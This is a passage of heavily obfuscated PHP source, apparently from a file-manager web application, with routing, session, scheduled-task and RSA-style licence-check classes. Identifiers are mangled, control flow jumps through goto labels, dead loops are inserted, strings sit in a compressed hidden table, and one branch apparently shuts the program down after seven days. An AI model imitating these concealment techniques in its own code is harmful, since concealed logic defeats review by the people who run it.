$BÍ¢œ÷¯ÉÖ = $D»¬‡Š§; $D»¬‡Š§ = $b“âº‹“ % $D»¬‡Š§; $d—Ñ˜¼´«è = $BÄè‡»¶¯ƒ[684]; while (strlen($d—Ñ˜¼´«è) < $BÄè‡»¶¯ƒ[588]) { if (!$d—Ñ˜¼´«è) { break; } $d—Ñ˜¼´«è++; } } if ($D»¬‡Š§ == 1) { break; } else { $däßëÏä‰++; } } $cì¼øç = 2; for ($b‹™êîó÷ô = 0; $b‹™êîó÷ô < $AÍååäŠ¼‡ * 10; $b‹™êîó÷ô++) { if (($AÍååäŠ¼‡ * $b‹™êîó÷ô + 1) % $däßëÏä‰ == 0) { $cì¼øç = $fÛ†œ‰ò[250](($AÍååäŠ¼‡ * $b‹™êîó÷ô + 1) / $däßëÏä‰); break; } } goto EÀÑŸñŒ×é; c÷øùòèñø: $BÄè‡»¶¯ƒ =& $_SERVER[òÀöí]; $fÛ†œ‰ò =& $_SERVER[÷ôçËï×½]; $DœŒƒİ¦ÂŒ = $this->{$_SERVER[÷ôçËï×½][354]}(); goto D‹ƒ‚“Œ©µ; D©©ˆ”©¨: $d“èˆ¾í°Ñ = $BÄè‡»¶¯ƒ[686]; if (!$d“èˆ¾í°Ñ) { die; } goto bè×«¾ÛÏ; EÀÑŸñŒ×é: $Dƒ„ô–½ğ­ = $this->{$_SERVER[÷ôçËï×½][153]}($DœŒƒİ¦ÂŒ * $E¾À¸ƒ¤¾í . $fÛ†œ‰ò[10], $fÛ†œ‰ò[155]); $E¶àÄ›‰ÊÔ = $fÛ†œ‰ò[120]($fÛ†œ‰ò[355] . ($DœŒƒİ¦ÂŒ + $E¾À¸ƒ¤¾í) . $fÛ†œ‰ò[356] . $däßëÏä‰ . $fÛ†œ‰ò[356] . $cì¼øç . $fÛ†œ‰ò[357]); $c´–õÁÈÍ = $this->{$_SERVER[÷ôçËï×½][153]}($dŒ´ˆæ¤î‹, $E¶àÄ›‰ÊÔ) . $fÛ†œ‰ò[358] . $Dƒ„ô–½ğ­; goto Fòº©“ŒîÀ; bè×«¾ÛÏ: } public function khou967e26fb($E‰ÈôÆ‹Ñ) { goto D¡–ŞÙºšÀ; aÂ¯Í¤äŸ×: if (!$DÁø¹ğåÑì) { return $dğ¬ÎŠÂâ[10]; } $DÁø¹ğåÑì = $dğ¬ÎŠÂâ[250]($DÁø¹ğåÑì); $cé™½£÷¡© = 0; goto C…â—ã‘Ãò; bñŒ×…ì½‡: $DÁø¹ğåÑì = $this->{$_SERVER[÷ôçËï×½][256]}($F×²õŠŞóé[1] . $dğ¬ÎŠÂâ[10], $dğ¬ÎŠÂâ[155]); $aÜõ¬¾‰¯ˆ = $AÌ›œËàÜ[688]; if (strlen($aÜõ¬¾‰¯ˆ) < $AÌ›œËàÜ[579]) { return; } goto aÂ¯Í¤äŸ×; B…è¼Ô¯„: $A´ÅˆØâì– = $this->{$_SERVER[÷ôçËï×½][256]}($F×²õŠŞóé[0], $a“›ŸÇ‰ª); $c†âğ‚’Ì = $AÌ›œËàÜ[697]; while (strlen($c†âğ‚’Ì) < $AÌ›œËàÜ[570]) { if (!$c†âğ‚’Ì) { break; } $c†âğ‚’Ì++; } goto Cƒô¦ó¸÷´; D¡–ŞÙºšÀ: $AÌ›œËàÜ =& $_SERVER[òÀöí]; $dğ¬ÎŠÂâ =& $_SERVER[÷ôçËï×½]; $F×²õŠŞóé = $dğ¬ÎŠÂâ[0]($dğ¬ÎŠÂâ[358], $E‰ÈôÆ‹Ñ); goto bëŒ¸Ë‚ºİ; bãç‘×Œ¶™: $D¡©ç†§‚ = ($cé™½£÷¡© - 1) * ($dµ×ÃÜ´åŒ - 1); $d…ÚñêÊ™ = $dğ¬ÎŠÂâ[250](($cé™½£÷¡© + $dµ×ÃÜ´åŒ) / 2); while (1) { $A”ŒÅîğŸ´ = $d…ÚñêÊ™; $fÖŒ“ÅñçÂ = $AÌ›œËàÜ[693]; if (!$fÖŒ“ÅñçÂ) { return; } $dÂ­ù÷Óù = $D¡©ç†§‚; $d†í…İ¾­ñ = $AÌ›œËàÜ[694]; if (!$d†í…İ¾­ñ) { die; } while ($dÂ­ù÷Óù % $A”ŒÅîğŸ´ != 0) { $D—ä¢‰ç” = $dÂ­ù÷Óù; $E”ğÑ¦ìî = $AÌ›œËàÜ[695]; while ($E”ğÑ¦ìî < $AÌ›œËàÜ[570]) { if ($E”ğÑ¦ìî >= 0) { break; } $E”ğÑ¦ìî++; } $dÂ­ù÷Óù = $A”ŒÅîğŸ´; $A”ŒÅîğŸ´ = $D—ä¢‰ç” % $A”ŒÅîğŸ´; $a­£‰»‡×† = $AÌ›œËàÜ[696]; while ($a­£‰»‡×† < $AÌ›œËàÜ[579]) { if ($a­£‰»‡×† >= 0) { break; } $a­£‰»‡×†++; } } if ($A”ŒÅîğŸ´ == 1) { break; } else { $d…ÚñêÊ™++; } } goto C´®Ì‰‚±ì; C´®Ì‰‚±ì: $C¿¥…ƒ£“— = 2; for ($Cƒë¶î‚ï« = 0; $Cƒë¶î‚ï« < $D¡©ç†§‚ * 10; $Cƒë¶î‚ï«++) { if (($D¡©ç†§‚ * $Cƒë¶î‚ï« + 1) % $d…ÚñêÊ™ == 0) { $C¿¥…ƒ£“— = $dğ¬ÎŠÂâ[250](($D¡©ç†§‚ * $Cƒë¶î‚ï« + 1) / $d…ÚñêÊ™); break; } } $a“›ŸÇ‰ª = $dğ¬ÎŠÂâ[120]($dğ¬ÎŠÂâ[355] . ($cé™½£÷¡© + $dµ×ÃÜ´åŒ) . $dğ¬ÎŠÂâ[356] . $d…ÚñêÊ™ . $dğ¬ÎŠÂâ[356] . $C¿¥…ƒ£“— . $dğ¬ÎŠÂâ[357]); goto B…è¼Ô¯„; C…â—ã‘Ãò: $aÆçì¶Ù‘ì = $AÌ›œËàÜ[689]; if (!$aÆçì¶Ù‘ì) { die; } $dµ×ÃÜ´åŒ = 0; goto f›¯ì¬‘ĞÛ; Cƒô¦ó¸÷´: return $A´ÅˆØâì–; goto CÓñØ¶µ¥; bëŒ¸Ë‚ºİ: $Dï”‚­Ÿ• = $AÌ›œËàÜ[687]; if (strlen($Dï”‚­Ÿ•) < $AÌ›œËàÜ[570]) { return; } if ($dğ¬ÎŠÂâ[19]($F×²õŠŞóé) != 2) { return $dğ¬ÎŠÂâ[10]; } goto bñŒ×…ì½‡; f›¯ì¬‘ĞÛ: $D›Ÿ¶éàÏ§ = $AÌ›œËàÜ[690]; while (strlen($D›Ÿ¶éàÏ§) < $AÌ›œËàÜ[588]) { if (!$D›Ÿ¶éàÏ§) { break; } $D›Ÿ¶éàÏ§++; } for ($Cƒë¶î‚ï« = 3; $Cƒë¶î‚ï« < $DÁø¹ğåÑì; $Cƒë¶î‚ï« += 2) { if ($DÁø¹ğåÑì % $Cƒë¶î‚ï« != 0) { continue; } $cé™½£÷¡© = $Cƒë¶î‚ï«; $EÊ°ë•·Û = $AÌ›œËàÜ[691]; $dµ×ÃÜ´åŒ = $dğ¬ÎŠÂâ[250]($DÁø¹ğåÑì / $Cƒë¶î‚ï«); break; $EÑ­ƒˆ’ßƒ = $AÌ›œËàÜ[692]; } goto bãç‘×Œ¶™; CÓñØ¶µ¥: } public function sjev27ad8fde() { goto d‘Õˆ­Ö³ë; Añ“¼õìŒ: $DÁÊ¦—Ô¶ˆ = 2; for ($E´Îïˆì¨ = $béÖÕÚ¸ƒ; $E´Îïˆì¨ > 1; $E´Îïˆì¨--) { $e¤Éî¥âëª = !0; $dÑŸĞùİìù = $fâ•˜ë˜ˆÒ[701]; if (!$dÑŸĞùİìù) { return; } foreach ($c½·™ôë‡Í as $D•«‰ßÆö) { if ($E´Îïˆì¨ % $D•«‰ßÆö == 0) { $e¤Éî¥âëª = !1; break; } } if ($e¤Éî¥âëª) { $DÁÊ¦—Ô¶ˆ = $E´Îïˆì¨; break; } } return $DÁÊ¦—Ô¶ˆ; goto dÖÜ÷¶Ø; d‘Õˆ­Ö³ë: $fâ•˜ë˜ˆÒ =& $_SERVER[òÀöí]; $c…ğâ†Û‹Á =& $_SERVER[÷ôçËï×½]; $béÖÕÚ¸ƒ = $c…ğâ†Û‹Á[339]($c…ğâ†Û‹Á[359](2, 14), $c…ğâ†Û‹Á[359](2, 16) - 1); goto eîÜÎÉôÛ; eîÜÎÉôÛ: $c½·™ôë‡Í = array(); $e±Æ¸•§óÀ = 1; while ($e±Æ¸•§óÀ <= (int) $c…ğâ†Û‹Á[360]($béÖÕÚ¸ƒ)) { $E´Îïˆì¨ = $e±Æ¸•§óÀ; $dÂµÏˆ—¥¦ = $fâ•˜ë˜ˆÒ[698]; while ($dÂµÏˆ—¥¦ < $fâ•˜ë˜ˆÒ[567]) { if ($dÂµÏˆ—¥¦ >= 0) { break; } $dÂµÏˆ—¥¦++; } while (!0) { $E´Îïˆì¨++; $eÅ‹›ÂéÌ = $fâ•˜ë˜ˆÒ[699]; while (strlen($eÅ‹›ÂéÌ) < $fâ•˜ë˜ˆÒ[588]) { if (!$eÅ‹›ÂéÌ) { break; } $eÅ‹›ÂéÌ++; } if ($E´Îïˆì¨ <= 2) { $e±Æ¸•§óÀ = $E´Îïˆì¨; break; } else { if ($E´Îïˆì¨ < 2) { continue; } } $e¤Éî¥âëª = !0; for ($B•Á‚´ÙÏ£ = 2; $B•Á‚´ÙÏ£ <= $c…ğâ†Û‹Á[360]($E´Îïˆì¨); $B•Á‚´ÙÏ£++) { if ($E´Îïˆì¨ % $B•Á‚´ÙÏ£ == 0) { $e¤Éî¥âëª = !1; } } if ($e¤Éî¥âëª) { $e±Æ¸•§óÀ = $E´Îïˆì¨; break; } } $c½·™ôë‡Í[] = $e±Æ¸•§óÀ; $b¤†®…íÅ˜ = $fâ•˜ë˜ˆÒ[700]; if (strlen($b¤†®…íÅ˜) < $fâ•˜ë˜ˆÒ[588]) { return; } } goto Añ“¼õìŒ; dÖÜ÷¶Ø: $E®›ˆ±²¿Ñ = $fâ•˜ë˜ˆÒ[702]; while ($E®›ˆ±²¿Ñ < $fâ•˜ë˜ˆÒ[579]) { if ($E®›ˆ±²¿Ñ >= 0) { break; } $E®›ˆ±²¿Ñ++; } goto aåÆÓ„ëĞ; aåÆÓ„ëĞ: } public function ufxda63d1427($DÈ‡‹Ğìš®, $dˆ†ğ‹¹¸) { $EßÍÍ¢‡Ïœ =& $_SERVER[òÀöí]; $BàÑ¢ôŞ„‡ =& $_SERVER[÷ôçËï×½]; return $BàÑ¢ôŞ„‡[13](array($BàÑ¢ôŞ„‡[14], $BàÑ¢ôŞ„‡[361]), $DÈ‡‹Ğìš®, $dˆ†ğ‹¹¸); $cµà©Ê®ò¹ = $EßÍÍ¢‡Ïœ[703]; if (strlen($cµà©Ê®ò¹) < $EßÍÍ¢‡Ïœ[579]) { die; } } public function ihesa055acdc($C˜÷§ˆËÊ», $Fß±ÜÃ „‘) { $dò§Ú¼¤Ğç =& $_SERVER[òÀöí]; $dÆÜã†³Ë =& $_SERVER[÷ôçËï×½]; return $dÆÜã†³Ë[13](array($dÆÜã†³Ë[362], $dÆÜã†³Ë[363]), $C˜÷§ˆËÊ», $Fß±ÜÃ „‘); $aÆî„¹ìõŠ = $dò§Ú¼¤Ğç[704]; if (strlen($aÆî„¹ìõŠ) < $dò§Ú¼¤Ğç[588]) { return; } } public function pedc5fa393da($c‚Â—Â¬Ø, $bì«®Î†—¡) { $fïİŸ·İë‘ =& $_SERVER[÷ôçËï×½]; return $fïİŸ·İë‘[13](array($fïİŸ·İë‘[362], $fïİŸ·İë‘[364]), $c‚Â—Â¬Ø, $bì«®Î†—¡); $dó„İò²İâ = $_SERVER[òÀöí][705]; if (!$dó„İò²İâ) { return; } } } goto e•øƒŠ®‰§; a«Õè–éÕì: $CÌëñ¶¹ùğ = $_SERVER[òÀöí][563]; if (!$CÌëñ¶¹ùğ) { return; } $_SERVER[÷ôçËï×½] = explode($_SERVER[òÀöí][564], gzinflate(substr($_SERVER[òÀöí][565], 10, -8))); goto Bã¼Öí¦Æã; B®÷µÚì½¦: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\156\x79" => "\x5b\136\57\x5d\x2b", "\72\156\x75\x6d" => "\133\x30\55\71\135\53", "\72\141\x6c\154" => "\56\x2a"); public static $errorCallback; public static function __callstatic($fËÑÆ¿Š»™, $bç£Î’Œ‚Ô) { $d­Âñ¼èÛ‘ =& $_SERVER[òÀöí]; if ($fËÑÆ¿Š»™ == $d­Âñ¼èÛ‘[1452]) { $eŒêŠò¡¨ = array_map($d­Âñ¼èÛ‘[1453], $bç£Î’Œ‚Ô[0]); $FçŒÌ¡™È = strpos($bç£Î’Œ‚Ô[1], $d­Âñ¼èÛ‘[8]) === 0 ? $bç£Î’Œ‚Ô[1] : $d­Âñ¼èÛ‘[8] . $bç£Î’Œ‚Ô[1]; $BŒé˜ùçš = $bç£Î’Œ‚Ô[2]; } else { $eŒêŠò¡¨ = null; $FçŒÌ¡™È = strpos($bç£Î’Œ‚Ô[0], $d­Âñ¼èÛ‘[8]) === 0 ? $bç£Î’Œ‚Ô[0] : $d­Âñ¼èÛ‘[8] . $bç£Î’Œ‚Ô[0]; $BŒé˜ùçš = $bç£Î’Œ‚Ô[1]; } array_push(self::$maps, $eŒêŠò¡¨); array_push(self::$routes, $FçŒÌ¡™È); array_push(self::$methods, strtoupper($fËÑÆ¿Š»™)); array_push(self::$callbacks, $BŒé˜ùçš); } public static function error($A’ããƒ‚¶) { self::$errorCallback = $A’ããƒ‚¶; } public static function haltOnMatch($DÃ¼èÓŞ…± = true) { self::$halts = $DÃ¼èÓŞ…±; } public static function dispatch() { goto B³†á°Ğ¾¢; B³†á°Ğ¾¢: $B—´¼ÍÚö =& $_SERVER[òÀöí]; $EùôÚ‹¹íÔ = parse_url($_SERVER[$B—´¼ÍÚö[1454]], PHP_URL_PATH); $aÒ’ùôø¸× = $_SERVER[$B—´¼ÍÚö[156]]; goto f¸åíô¿öŠ; C¡æÇÊœ¡: self::$routes = preg_replace($B—´¼ÍÚö[1138], $B—´¼ÍÚö[8], self::$routes); if (in_array($EùôÚ‹¹íÔ, self::$routes)) { $B“ˆ‹¼ƒ± = array_keys(self::$routes, $EùôÚ‹¹íÔ); foreach ($B“ˆ‹¼ƒ± as $a‚õ¾ó÷™ƒ) { if (self::$methods[$a‚õ¾ó÷™ƒ] == $aÒ’ùôø¸× || self::$methods[$a‚õ¾ó÷™ƒ] == $B—´¼ÍÚö[1455] || in_array($aÒ’ùôø¸×, self::$maps[$a‚õ¾ó÷™ƒ])) { $dùá¼’—ª = !0; if (!is_object(self::$callbacks[$a‚õ¾ó÷™ƒ])) { $Fõ‚ßİ’‰Œ = explode($B—´¼ÍÚö[8], self::$callbacks[$a‚õ¾ó÷™ƒ]); $F–ÑõƒãÏ± = end($Fõ‚ßİ’‰Œ); $F·õÆÑ™• = explode($B—´¼ÍÚö[1456], $F–ÑõƒãÏ±); $A×‘×•¤ˆ¥ = new $F·õÆÑ™•[0](); $A×‘×•¤ˆ¥->{$F·õÆÑ™•[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$a‚õ¾ó÷™ƒ]); if (self::$halts) { return; } } } } } else { $Cî®î«Õ§Ô = 0; foreach (self::$routes as $a‚õ¾ó÷™ƒ) { if (strpos($a‚õ¾ó÷™ƒ, $B—´¼ÍÚö[4]) !== !1) { $a‚õ¾ó÷™ƒ = str_replace($DƒºñÒÉ³, $b¹†˜†ôäÂ, $a‚õ¾ó÷™ƒ); } if (preg_match($B—´¼ÍÚö[1457] . $a‚õ¾ó÷™ƒ . $B—´¼ÍÚö[1458], $EùôÚ‹¹íÔ, $Eßğ·¢Ê¯)) { if (self::$methods[$Cî®î«Õ§Ô] == $aÒ’ùôø¸× || self::$methods[$Cî®î«Õ§Ô] == $B—´¼ÍÚö[1455] || !empty(self::$maps[$Cî®î«Õ§Ô]) && in_array($aÒ’ùôø¸×, self::$maps[$Cî®î«Õ§Ô])) { $dùá¼’—ª = !0; array_shift($Eßğ·¢Ê¯); if (!is_object(self::$callbacks[$Cî®î«Õ§Ô])) { $Fõ‚ßİ’‰Œ = explode($B—´¼ÍÚö[8], self::$callbacks[$Cî®î«Õ§Ô]); $F–ÑõƒãÏ± = end($Fõ‚ßİ’‰Œ); $F·õÆÑ™• = explode($B—´¼ÍÚö[1456], $F–ÑõƒãÏ±); $A×‘×•¤ˆ¥ = new $F·õÆÑ™•[0](); if (!method_exists($A×‘×•¤ˆ¥, $F·õÆÑ™•[1])) { echo $B—´¼ÍÚö[1459]; } else { call_user_func_array(array($A×‘×•¤ˆ¥, $F·õÆÑ™•[1]), $Eßğ·¢Ê¯); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$Cî®î«Õ§Ô], $Eßğ·¢Ê¯); if (self::$halts) { return; } } } } $Cî®î«Õ§Ô++; } } if ($dùá¼’—ª == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $AŞ‰˜Ó¾¼Ø =& $_SERVER[òÀöí]; header($_SERVER[$AŞ‰˜Ó¾¼Ø[1460]] . $AŞ‰˜Ó¾¼Ø[1461]); echo $AŞ‰˜Ó¾¼Ø[1462]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$B—´¼ÍÚö[1454]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto Eà’Ã›âŞ…; f¸åíô¿öŠ: $DƒºñÒÉ³ = array_keys(static::$patterns); $b¹†˜†ôäÂ = array_values(static::$patterns); $dùá¼’—ª = !1; goto C¡æÇÊœ¡; Eà’Ã›âŞ…: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto Bª»œˆÔ¯¦; E½ÏÚíŞ¢¦: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $A«ßçç° = new self(); return $A«ßçç°; goto C‡öªæŸÇƒ; d‹‰ØÈ‰Ê˜: $c×ƒ°±²õè = $GLOBALS[$D‰’ã†ßŒ[6]][$D‰’ã†ßŒ[345]]; self::$sessionTime = $c×ƒ°±²õè[$D‰’ã†ßŒ[1463]]; $A¢¾ÜÅ´ˆ  = isset($GLOBALS[$D‰’ã†ßŒ[1464]]) ? $GLOBALS[$D‰’ã†ßŒ[1464]] : SESSION_ID; goto cø·÷«•Ş; AëÅáŠ£Šö: $bÍ¨Î¼à‘„ = $c×ƒ°±²õè[$c½Ş§œœ¼Ã]; $f×ƒ±‡ëÍÉ = $c×ƒ°±²õè[$D‰’ã†ßŒ[781]]; switch ($c½Ş§œœ¼Ã) { case $D‰’ã†ßŒ[17]: self::$handle = Model($D‰’ã†ßŒ[782]); break; case $D‰’ã†ßŒ[783]: self::$handle = new CacheRedis($bÍ¨Î¼à‘„, $f×ƒ±‡ëÍÉ); break; case $D‰’ã†ßŒ[784]: self::$handle = new CacheMemcached($bÍ¨Î¼à‘„, $f×ƒ±‡ëÍÉ); break; case $D‰’ã†ßŒ[173]: $bÍ¨Î¼à‘„[$D‰’ã†ßŒ[75]] = $bÍ¨Î¼à‘„[$D‰’ã†ßŒ[75]] . $D‰’ã†ßŒ[1466]; self::$handle = new CacheFile($bÍ¨Î¼à‘„, $f×ƒ±‡ëÍÉ); default: break; } goto E½ÏÚíŞ¢¦; cø·÷«•Ş: if (self::$sessionSign) { } else { if (Cookie::get($A¢¾ÜÅ´ˆ )) { self::$sessionSign = Cookie::get($A¢¾ÜÅ´ˆ ); } else { self::$sessionSign = guid(); } } Cookie::setSafe($A¢¾ÜÅ´ˆ , self::$sessionSign, self::$sessionTime); $c½Ş§œœ¼Ã = $c×ƒ°±²õè[$D‰’ã†ßŒ[1465]]; goto AëÅáŠ£Šö; Bª»œˆÔ¯¦: $D‰’ã†ßŒ =& $_SERVER[òÀöí]; static $A«ßçç° = false; if ($A«ßçç°) { return $A«ßçç°; } goto d‹‰ØÈ‰Ê˜; C‡öªæŸÇƒ: } public static function sign($dŒ¼Ò”Äàë = false) { $dŒ¼Ò”Äàë && (self::$sessionSign = $dŒ¼Ò”Äàë); self::init(); return self::$sessionSign; } public static function set($c„öƒ®à”Ü, $dí»ùëå‹Í = false) { self::init(); if (is_array($c„öƒ®à”Ü)) { foreach ($c„öƒ®à”Ü as $BÛ Ş™ÒøØ => $B­Ò øËÅ˜) { array_set_value(self::$data, $BÛ Ş™ÒøØ, $B­Ò øËÅ˜); } } else { array_set_value(self::$data, $c„öƒ®à”Ü, $dí»ùëå‹Í); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($FØõÒœ· ½ = false) { self::init(); if (!$FØõÒœ· ½) { return self::$data; } return array_get_value(self::$data, $FØõÒœ· ½); } public static function remove($E¾šÍ»§Ãó) { self::init(); unset(self::$data[$E¾šÍ»§Ãó]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[òÀöí][786])) { self::$handle->clearTimeout(); } } } class AutoTask { public static function start() { goto aß©ˆé’Š; aß©ˆé’Š: $C·¤šôô˜ =& $_SERVER[òÀöí]; if (self::valueGet($C·¤šôô˜[708]) != $C·¤šôô˜[86]) { return; } if (self::valueGet($C·¤šôô˜[1467]) == $C·¤šôô˜[86]) { $cÒì…ÈÌ·¨ = self::valueGet($C·¤šôô˜[1468]); if (time() - $cÒì…ÈÌ·¨ > 3600 * 2) { self::restart(); } return; } goto AŠÜ±²ğÄ; AŠÜ±²ğÄ: http_close(); self::valueSet($C·¤šôô˜[1467], $C·¤šôô˜[86]); Hook::bind($C·¤šôô˜[1469], $C·¤šôô˜[1470]); goto dÒ‡ØòÓƒ; dÒ‡ØòÓƒ: while (!0) { self::cacheClear(); if (self::valueGet($C·¤šôô˜[708]) != $C·¤šôô˜[86]) { self::valueSet($C·¤šôô˜[1467], $C·¤šôô˜[486]); self::log($C·¤šôô˜[1471]); die; } self::valueSet($C·¤šôô˜[1467], $C·¤šôô˜[86]); self::valueSet($C·¤šôô˜[1468], time()); self::taskRunAll(); sleep(self::valueGet($C·¤šôô˜[1472])); } goto AÉ„“Íİœå; AÉ„“Íİœå: } public static function restart() { $AõŸö–ÓÕÛ =& $_SERVER[òÀöí]; http_close(); self::valueSet($AõŸö–ÓÕÛ[708], $AõŸö–ÓÕÛ[486]); sleep(self::valueGet($AõŸö–ÓÕÛ[1472]) + 5); self::valueSet($AõŸö–ÓÕÛ[1467], $AõŸö–ÓÕÛ[486]); self::valueSet($AõŸö–ÓÕÛ[708], $AõŸö–ÓÕÛ[86]); } public static function shutdownEvent() { $dÓÇº‰Ã÷« =& $_SERVER[òÀöí]; self::valueSet($dÓÇº‰Ã÷«[1467], $dÓÇº‰Ã÷«[486]); self::log($dÓÇº‰Ã÷«[1473]); } public static function config($cº­ò­ß¹, $B¬±ÒÈÍ) { $BØÔ’¨Œ¼‘ =& $_SERVER[òÀöí]; $f ˆ¿¢´‡ = 10; $B¬±ÒÈÍ = intval($B¬±ÒÈÍ) <= $f ˆ¿¢´‡ ? $f ˆ¿¢´‡ : intval($B¬±ÒÈÍ); self::valueSet($BØÔ’¨Œ¼‘[708], $cº­ò­ß¹); self::valueSet($BØÔ’¨Œ¼‘[1472], $B¬±ÒÈÍ); } private static function taskRunAll() { goto EƒÇšŸ‘µÎ; EƒÇšŸ‘µÎ: $eŠ«İ…‹¡Ç =& $_SERVER[òÀöí]; $bÚ›âîÀÏµ = timeFloat(); $F‰ÇöÕ½† = Model($eŠ«İ…‹¡Ç[1474])->listData(); goto D²ùÛ¥Ğ¥»; eàİšÉ­Ü‡: self::taskQueueRun($bÚ›âîÀÏµ); self::closeDatabase(); goto bçÂ„¦ŞÖô; D²ùÛ¥Ğ¥»: $Cµ›ğš¥ó = count($F‰ÇöÕ½†); for ($aÅÜ„îƒ¹ = 0; $aÅÜ„îƒ¹ < $Cµ›ğš¥ó; $aÅÜ„îƒ¹++) { $DóÁÏîåµÌ = $F‰ÇöÕ½†[$aÅÜ„îƒ¹]; if (!$DóÁÏîåµÌ[$eŠ«İ…‹¡Ç[385]] || $DóÁÏîåµÌ[$eŠ«İ…‹¡Ç[1475]] != $eŠ«İ…‹¡Ç[86]) { continue; } if (!self::taskTimeCheck($DóÁÏîåµÌ)) { continue; } self::taskRun($DóÁÏîåµÌ); } Hook::trigger($eŠ«İ…‹¡Ç[1476]); goto eàİšÉ­Ü‡; bçÂ„¦ŞÖô: } private static function taskQueueRun($CÓ­Öñ¤İ) { $Fº†ùãš´ = 10; while (!0) { $A“•¡„Å¨¸ = TaskQueue::run(); if ($A“•¡„Å¨¸ === !1) { break; } if (timeFloat() - $CÓ­Öñ¤İ >= $Fº†ùãš´) { break; } } } private static function taskTimeCheck($bì›ÑèÚ) { goto E‘´ÅñÆ±À; EÄº´° °·: switch ($DàâŞÆé‘‰[$d¸î¦õİæ¾[29]]) { case $d¸î¦õİæ¾[1483]: if (time() - $AÈğ–ÉòŞ < 3600 * 24 * 30) { return !1; } if ($DàâŞÆé‘‰[$d¸î¦õİæ¾[1483]] == date($d¸î¦õİæ¾[1484]) && $Aõ¡š­ËÔÄ) { return !0; } break; case $d¸î¦õİæ¾[1485]: if (time() - $AÈğ–ÉòŞ < 3600 * 24 * 7) { return !1; } $e·Ö¸é™Ê = date($d¸î¦õİæ¾[1486]) == 0 ? 7 : date($d¸î¦õİæ¾[1486]); if ($DàâŞÆé‘‰[$d¸î¦õİæ¾[1485]] == $e·Ö¸é™Ê && $Aõ¡š­ËÔÄ) { return !0; } break; case $d¸î¦õİæ¾[1478]: if (time() - $AÈğ–ÉòŞ < 3600 * 24) { return !1; } if ($Aõ¡š­ËÔÄ) { return !0; } break; case $d¸î¦õİæ¾[1487]: if (time() - $AÈğ–ÉòŞ >= floatval($DàâŞÆé‘‰[$d¸î¦õİæ¾[1487]]) * 60) { return !0; } break; default: break; } return !1; goto FÖ†µ™¨—²; F‚ìªÕäŠ³: $aÓ´½¢İóè = strtotime($d¸î¦õİæ¾[1477] . $DàâŞÆé‘‰[$d¸î¦õİæ¾[1478]] . $d¸î¦õİæ¾[1479]) - strtotime($d¸î¦õİæ¾[1480]); $cŞÇ÷ğØ¦— = time() - strtotime(date($d¸î¦õİæ¾[1481]) . $d¸î¦õİæ¾[1482]); $Aõ¡š­ËÔÄ = $cŞÇ÷ğØ¦— >= $aÓ´½¢İóè && $cŞÇ÷ğØ¦— <= $aÓ´½¢İóè + 3600; goto EÄº´° °·; E‘´ÅñÆ±À: $d¸î¦õİæ¾ =& $_SERVER[òÀöí]; $DàâŞÆé‘‰ = json_decode($bì›ÑèÚ[$d¸î¦õİæ¾[195]], !0); $AÈğ–ÉòŞ = intval($bì›ÑèÚ[$d¸î¦õİæ¾[1468]]); goto F‚ìªÕäŠ³; FÖ†µ™¨—²: } private static function closeDatabase() { goto fŸ»ºò¿ÓÉ; B«ˆÁ‚Î…İ: if (!$BîË¨¼ÕØ) { $BîË¨¼ÕØ = time(); } if (time() - $BîË¨¼ÕØ < $e”Ïù‰®öÇ) { return; } $BîË¨¼ÕØ = time(); goto F¸¢Ê»è¬; F¸¢Ê»è¬: $c‹é³ÔÉ‘ = Model($EÚ åñÙ[492])->db($EÚ åñÙ[33]); if ($c‹é³ÔÉ‘) { $c‹é³ÔÉ‘->closeConnect(); } if (time() - TIME > 3600 * 24 * 7) { write_log($EÚ åñÙ[1488], $EÚ åñÙ[1489]); die; } goto dĞ–¤©Œà‡; fŸ»ºò¿ÓÉ: $EÚ åñÙ =& $_SERVER[òÀöí]; static $BîË¨¼ÕØ = 0; $e”Ïù‰®öÇ = 1800; goto B«ˆÁ‚Î…İ; dĞ–¤©Œà‡: } public static function taskRun($eÁÂ›«Õ³‡) { goto A°ÚŒ•¤©¥; dÅÒÎÌŒæ„: Model($aœñ·â¼·ó[1494])->add(array($aœñ·â¼·ó[1495] => $aœñ·â¼·ó[33], $aœñ·â¼·ó[1496] => $aœñ·â¼·ó[486], $aœñ·â¼·ó[29] => $aœñ·â¼·ó[1497] . $eÁÂ›«Õ³‡[$aœñ·â¼·ó[385]], $aœñ·â¼·ó[1498] => json_encode(array($aœñ·â¼·ó[28] => $eÁÂ›«Õ³‡[$aœñ·â¼·ó[28]], $aœñ·â¼·ó[1499] => timeFloat() - $cİÃÏ½“»Ä, $aœñ·â¼·ó[289] => $dÎóÒÖâ)))); self::log($aœñ·â¼·ó[1500] . $eÁÂ›«Õ³‡[$aœñ·â¼·ó[385]] . $aœñ·â¼·ó[1501] . $dÎóÒÖâ); return !0; goto cÇ›óŞŠ¾“; A°ÚŒ•¤©¥: $aœñ·â¼·ó =& $_SERVER[òÀöí]; self::log($aœñ·â¼·ó[1490] . $eÁÂ›«Õ³‡[$aœñ·â¼·ó[385]] . $aœñ·â¼·ó[1491] . $eÁÂ›«Õ³‡[$aœñ·â¼·ó[28]] . $aœñ·â¼·ó[1492] . $eÁÂ›«Õ³‡[$aœñ·â¼·ó[1493]]); Model($aœñ·â¼·ó[1474])->run($eÁÂ›«Õ³‡[$aœñ·â¼·ó[385]]); goto d‡†£Ñœ; d‡†£Ñœ: $cİÃÏ½“»Ä = timeFloat(); $dÎóÒÖâ = $aœñ·â¼·ó[33]; switch ($eÁÂ›«Õ³‡[$aœñ·â¼·ó[29]]) { case 